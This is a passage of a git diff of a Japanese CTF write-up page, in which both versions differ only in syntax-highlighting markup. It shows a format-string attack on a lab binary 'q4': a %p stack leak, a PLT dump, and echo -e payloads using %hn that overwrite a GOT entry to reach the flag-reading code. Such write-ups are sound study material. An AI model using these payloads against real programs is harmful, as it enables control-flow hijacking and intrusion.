class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br></div></div><ul><li>出力より, 次のようにmainが実行されていることがわかる
-<ul><li>puts</li> <li>fgets</li> <li>printf</li> <li>printf</li> <li>putchar</li> <li>fopen</li> <li>puts</li></ul></li> <li>fgetsを使用しているのでbofかformat stringを狙える気がする</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ ./q4
-What's your name?
+</code></pre></div><ul><li>出力より, 次のようにmainが実行されていることがわかる
+<ul><li>puts</li> <li>fgets</li> <li>printf</li> <li>printf</li> <li>putchar</li> <li>fopen</li> <li>puts</li></ul></li> <li>fgetsを使用しているのでbofかformat stringを狙える気がする</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ ./q4
+What<span class="token string">'s your name?
 AAAAAAAAAAAAAAAAAAAAAa
 Hi, AAAAAAAAAAAAAAAAAAAAAa
 
@@ -130,83 +129,83 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Do you want the flag?
 ^C
 [q4@localhost ~]$ ./q4
-What's your name?
+What'</span>s your name?
 AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
 Hi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><ul><li>format stringで行けそう!</li> <li>引数は6個目</li> <li>6個目にsystem関数の実行番地を仕込んで実行すれば<code>/bin/sh</code>を実行できるか?</li> <li>できなさそう(system関数の番地がわからない)</li> <li>使えそうな関数を探す</li> <li></li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ objdump -d -M intel -j .plt ./q4 
+</code></pre></div><ul><li>format stringで行けそう!</li> <li>引数は6個目</li> <li>6個目にsystem関数の実行番地を仕込んで実行すれば<code>/bin/sh</code>を実行できるか?</li> <li>できなさそう(system関数の番地がわからない)</li> <li>使えそうな関数を探す</li> <li></li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ objdump -d -M intel -j .plt ./q4 
 
-./q4:     file format elf32-i386
+./q4:     <span class="token function">file</span> <span class="token function">format</span> elf32-i386
 
 
 Disassembly of section .plt:
 
-08048454 &lt;__gmon_start__@plt-0x10&gt;:
-8048454:       ff 35 d4 99 04 08       push   DWORD PTR ds:0x80499d4
-804845a:       ff 25 d8 99 04 08       jmp    DWORD PTR ds:0x80499d8
-8048460:       00 00                   add    BYTE PTR [eax],al
-...
+08048454 <span class="token operator">&lt;</span>__gmon_start__@plt-0x1<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:
+<span class="token number">8048454</span>:       ff <span class="token number">35</span> d4 <span class="token number">99</span> 04 08       push   DWORD PTR ds:0x80499d4
+804845a:       ff <span class="token number">25</span> d8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499d8
+<span class="token number">8048460</span>:       00 00                   <span class="token function">add</span>    BYTE PTR <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>,al
+<span class="token punctuation">..</span>.
 
-08048464 &lt;__gmon_start__@plt&gt;:
-8048464:       ff 25 dc 99 04 08       jmp    DWORD PTR ds:0x80499dc
-804846a:       68 00 00 00 00          push   0x0
-804846f:       e9 e0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+08048464 <span class="token operator">&lt;</span>__gmon_start__@plt<span class="token operator">&gt;</span>:
+<span class="token number">8048464</span>:       ff <span class="token number">25</span> <span class="token function">dc</span> <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499dc
+804846a:       <span class="token number">68</span> 00 00 00 00          push   0x0
+804846f:       e9 e0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-08048474 &lt;putchar@plt&gt;:
-8048474:       ff 25 e0 99 04 08       jmp    DWORD PTR ds:0x80499e0
-804847a:       68 08 00 00 00          push   0x8
-804847f:       e9 d0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+08048474 <span class="token operator">&lt;</span>putchar@plt<span class="token operator">&gt;</span>:
+<span class="token number">8048474</span>:       ff <span class="token number">25</span> e0 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e0
+804847a:       <span class="token number">68</span> 08 00 00 00          push   0x8
+804847f:       e9 d0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-08048484 &lt;fgets@plt&gt;:
-8048484:       ff 25 e4 99 04 08       jmp    DWORD PTR ds:0x80499e4
-804848a:       68 10 00 00 00          push   0x10
-804848f:       e9 c0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+08048484 <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>:
+<span class="token number">8048484</span>:       ff <span class="token number">25</span> e4 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e4
+804848a:       <span class="token number">68</span> <span class="token number">10</span> 00 00 00          push   0x10
+804848f:       e9 c0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-08048494 &lt;__libc_start_main@plt&gt;:
-8048494:       ff 25 e8 99 04 08       jmp    DWORD PTR ds:0x80499e8
-804849a:       68 18 00 00 00          push   0x18
-804849f:       e9 b0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+08048494 <span class="token operator">&lt;</span>__libc_start_main@plt<span class="token operator">&gt;</span>:
+<span class="token number">8048494</span>:       ff <span class="token number">25</span> e8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e8
+804849a:       <span class="token number">68</span> <span class="token number">18</span> 00 00 00          push   0x18
+804849f:       e9 b0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-080484a4 &lt;fopen@plt&gt;:
-80484a4:       ff 25 ec 99 04 08       jmp    DWORD PTR ds:0x80499ec
-80484aa:       68 20 00 00 00          push   0x20
-80484af:       e9 a0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+080484a4 <span class="token operator">&lt;</span>fopen@plt<span class="token operator">&gt;</span>:
+80484a4:       ff <span class="token number">25</span> ec <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499ec
+80484aa:       <span class="token number">68</span> <span class="token number">20</span> 00 00 00          push   0x20
+80484af:       e9 a0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-080484b4 &lt;printf@plt&gt;:
-80484b4:       ff 25 f0 99 04 08       jmp    DWORD PTR ds:0x80499f0
-80484ba:       68 28 00 00 00          push   0x28
-80484bf:       e9 90 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+080484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>:
+80484b4:       ff <span class="token number">25</span> f0 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f0
+80484ba:       <span class="token number">68</span> <span class="token number">28</span> 00 00 00          push   0x28
+80484bf:       e9 <span class="token number">90</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-080484c4 &lt;puts@plt&gt;:
-80484c4:       ff 25 f4 99 04 08       jmp    DWORD PTR ds:0x80499f4
-80484ca:       68 30 00 00 00          push   0x30
-80484cf:       e9 80 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+080484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>:
+80484c4:       ff <span class="token number">25</span> f4 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f4
+80484ca:       <span class="token number">68</span> <span class="token number">30</span> 00 00 00          push   0x30
+80484cf:       e9 <span class="token number">80</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-080484d4 &lt;__gxx_personality_v0@plt&gt;:
-80484d4:       ff 25 f8 99 04 08       jmp    DWORD PTR ds:0x80499f8
-80484da:       68 38 00 00 00          push   0x38
-80484df:       e9 70 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+080484d4 <span class="token operator">&lt;</span>__gxx_personality_v0@plt<span class="token operator">&gt;</span>:
+80484d4:       ff <span class="token number">25</span> f8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f8
+80484da:       <span class="token number">68</span> <span class="token number">38</span> 00 00 00          push   0x38
+80484df:       e9 <span class="token number">70</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
 
-080484e4 &lt;strcmp@plt&gt;:
-80484e4:       ff 25 fc 99 04 08       jmp    DWORD PTR ds:0x80499fc
-80484ea:       68 40 00 00 00          push   0x40
-80484ef:       e9 60 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><ul><li>fopen関数が使えるのでは?</li> <li>先ほどのmain関数を見返してみると, fopenしてくれている部分がある</li> <li>このfopenをprintfとかputsとかから参照してやれば良さそう?</li> <li>fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる</li></ul> <h2 id="攻撃のまとめ"><a href="#攻撃のまとめ" aria-hidden="true" class="header-anchor">#</a> 攻撃のまとめ</h2> <ul><li>fopen関数の番地は, <code>0x080484a4</code></li> <li>printf関数の番地は, <code>0x080484b4</code></li> <li>printf関数内で呼び出しているのは, <code>0x080499f0</code>なので, これを<code>0x080486a0</code>に上書きする</li></ul> <table><thead><tr><th style="text-align:center">入力アドレス</th> <th style="text-align:center">出力バイト数</th> <th style="text-align:center">総出力バイト数</th> <th style="text-align:center">補足</th></tr></thead> <tbody><tr><td style="text-align:center">0x080499f0</td> <td style="text-align:center">4</td> <td style="text-align:center">4</td> <td style="text-align:center">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center">0x080499f2</td> <td style="text-align:center">4</td> <td style="text-align:center">8</td> <td style="text-align:center">''</td></tr> <tr><td style="text-align:center">%39400x</td> <td style="text-align:center">39400</td> <td style="text-align:center">39408</td> <td style="text-align:center">39408(0x99f0)-8=39400</td></tr> <tr><td style="text-align:center">%6$n</td> <td style="text-align:center">0</td> <td style="text-align:center">39408</td> <td style="text-align:center">引数は6個目から</td></tr> <tr><td style="text-align:center">%28180x</td> <td style="text-align:center">28180</td> <td style="text-align:center">67588</td> <td style="text-align:center">67588(0x0804)-39408=28180</td></tr> <tr><td style="text-align:center">%7$n</td> <td style="text-align:center">0</td> <td style="text-align:center">67588</td> <td style="text-align:center">次は7個目</td></tr></tbody></table> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>通らない</li> <li>printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
+080484e4 <span class="token operator">&lt;</span>strcmp@plt<span class="token operator">&gt;</span>:
+80484e4:       ff <span class="token number">25</span> fc <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499fc
+80484ea:       <span class="token number">68</span> <span class="token number">40</span> 00 00 00          push   0x40
+80484ef:       e9 <span class="token number">60</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
+</code></pre></div><ul><li>fopen関数が使えるのでは?</li> <li>先ほどのmain関数を見返してみると, fopenしてくれている部分がある</li> <li>このfopenをprintfとかputsとかから参照してやれば良さそう?</li> <li>fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる</li></ul> <h2 id="攻撃のまとめ"><a href="#攻撃のまとめ" aria-hidden="true" class="header-anchor">#</a> 攻撃のまとめ</h2> <ul><li>fopen関数の番地は, <code>0x080484a4</code></li> <li>printf関数の番地は, <code>0x080484b4</code></li> <li>printf関数内で呼び出しているのは, <code>0x080499f0</code>なので, これを<code>0x080486a0</code>に上書きする</li></ul> <table><thead><tr><th style="text-align:center;">入力アドレス</th> <th style="text-align:center;">出力バイト数</th> <th style="text-align:center;">総出力バイト数</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">0x080499f0</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center;">0x080499f2</td> <td style="text-align:center;">4</td> <td style="text-align:center;">8</td> <td style="text-align:center;">''</td></tr> <tr><td style="text-align:center;">%39400x</td> <td style="text-align:center;">39400</td> <td style="text-align:center;">39408</td> <td style="text-align:center;">39408(0x99f0)-8=39400</td></tr> <tr><td style="text-align:center;">%6$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">39408</td> <td style="text-align:center;">引数は6個目から</td></tr> <tr><td style="text-align:center;">%28180x</td> <td style="text-align:center;">28180</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">67588(0x0804)-39408=28180</td></tr> <tr><td style="text-align:center;">%7$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">次は7個目</td></tr></tbody></table> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%39400x%6<span class="token variable">$hn</span>%28180x%7<span class="token variable">$hn</span>'</span> <span class="token operator">|</span> ./q4
+</code></pre></div><ul><li>通らない</li> <li>printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%39400x%6<span class="token variable">$hn</span>%28180x%7<span class="token variable">$hn</span>'</span> <span class="token operator">|</span> ./q4
 ~~ 略 ~~~
 Segmentation Fault
 ~~ 略 ~~~
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>gdbで原因を探る</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ echo -e 'r\n\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | gdb -q ./q4
-Reading symbols from /home/q4/q4...(no debugging symbols found)...done.
-(gdb) Hangup detected on fd 0
+</code></pre></div><ul><li>gdbで原因を探る</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'r<span class="token entity" title="\n">\n</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%39400x%6<span class="token variable">$hn</span>%28180x%7<span class="token variable">$hn</span>'</span> <span class="token operator">|</span> gdb -q ./q4
+Reading symbols from /home/q4/q4<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> Hangup detected on fd <span class="token number">0</span>
 error detected on stdin
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>パイプでバグって正しい結果が出力できていないらしい
-<ul><li>ref. <a href="https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li> <li>引数ではなく, 呼び出す番地が正しくないという仮説をたててみる</li> <li>fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?</li> <li>jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう</li> <li>まとめると次のような感じ</li></ul> <table><thead><tr><th style="text-align:center">入力アドレス</th> <th style="text-align:center">出力バイト数</th> <th style="text-align:center">総出力バイト数</th> <th style="text-align:center">補足</th></tr></thead> <tbody><tr><td style="text-align:center">0x080499f0</td> <td style="text-align:center">4</td> <td style="text-align:center">4</td> <td style="text-align:center">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center">0x080499f2</td> <td style="text-align:center">4</td> <td style="text-align:center">8</td> <td style="text-align:center">''</td></tr> <tr><td style="text-align:center">%34441x</td> <td style="text-align:center">34441</td> <td style="text-align:center">34449</td> <td style="text-align:center">34449(0x8691)-8=34441</td></tr> <tr><td style="text-align:center">%6$n</td> <td style="text-align:center">0</td> <td style="text-align:center">34449</td> <td style="text-align:center">引数は6個目から</td></tr> <tr><td style="text-align:center">%33139x</td> <td style="text-align:center">33139</td> <td style="text-align:center">67588</td> <td style="text-align:center">67588(0x10804)-34449=33139</td></tr> <tr><td style="text-align:center">%7$n</td> <td style="text-align:center">0</td> <td style="text-align:center">67588</td> <td style="text-align:center">次は7個目</td></tr></tbody></table> <ul><li>コマンドは次の通り</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
+</code></pre></div><ul><li>パイプでバグって正しい結果が出力できていないらしい
+<ul><li>ref. https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0</li></ul></li> <li>引数ではなく, 呼び出す番地が正しくないという仮説をたててみる</li> <li>fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?</li> <li>jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう</li> <li>まとめると次のような感じ</li></ul> <table><thead><tr><th style="text-align:center;">入力アドレス</th> <th style="text-align:center;">出力バイト数</th> <th style="text-align:center;">総出力バイト数</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">0x080499f0</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center;">0x080499f2</td> <td style="text-align:center;">4</td> <td style="text-align:center;">8</td> <td style="text-align:center;">''</td></tr> <tr><td style="text-align:center;">%34441x</td> <td style="text-align:center;">34441</td> <td style="text-align:center;">34449</td> <td style="text-align:center;">34449(0x8691)-8=34441</td></tr> <tr><td style="text-align:center;">%6$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">34449</td> <td style="text-align:center;">引数は6個目から</td></tr> <tr><td style="text-align:center;">%33139x</td> <td style="text-align:center;">33139</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">67588(0x10804)-34449=33139</td></tr> <tr><td style="text-align:center;">%7$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">次は7個目</td></tr></tbody></table> <ul><li>コマンドは次の通り</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%34441x%6<span class="token variable">$hn</span>%33139x%7<span class="token variable">$hn</span>'</span> <span class="token operator">|</span> ./q4
 ~~ 略 ~~~
 Do you want the flag?
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>通らない...</li> <li>一応putcharも試す</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
+</code></pre></div><ul><li>通らない...</li> <li>一応putcharも試す</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%34441x%6<span class="token variable">$hn</span>%33139x%7<span class="token variable">$hn</span>'</span> <span class="token operator">|</span> ./q4
 ~~ 略 ~~~
 FLAG_~~~ 略 ~~~
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>通った!!!!!!!</li></ul> <h1 id="感想"><a href="#感想" aria-hidden="true" class="header-anchor">#</a> 感想</h1> <ul><li>通せたのは嬉しい</li> <li>printfは何故に通らなかったの?</li> <li>ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい</li></ul></div> <div class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2019-9-4 11:48:57</span></div></div> <!----> </div> <!----></div></div>
-    <script src="/note/assets/js/app.72859486.js" defer></script><script src="/note/assets/js/52.f9c2959c.js" defer></script>
+</code></pre></div><ul><li>通った!!!!!!!</li></ul> <h1 id="感想"><a href="#感想" aria-hidden="true" class="header-anchor">#</a> 感想</h1> <ul><li>通せたのは嬉しい</li> <li>printfは何故に通らなかったの?</li> <li>ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい</li></ul></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.e447834c.js" defer></script><script src="/assets/js/4.ea1d030e.js" defer></script><script src="/assets/js/51.b5080153.js" defer></script>
   </body>
 </html>
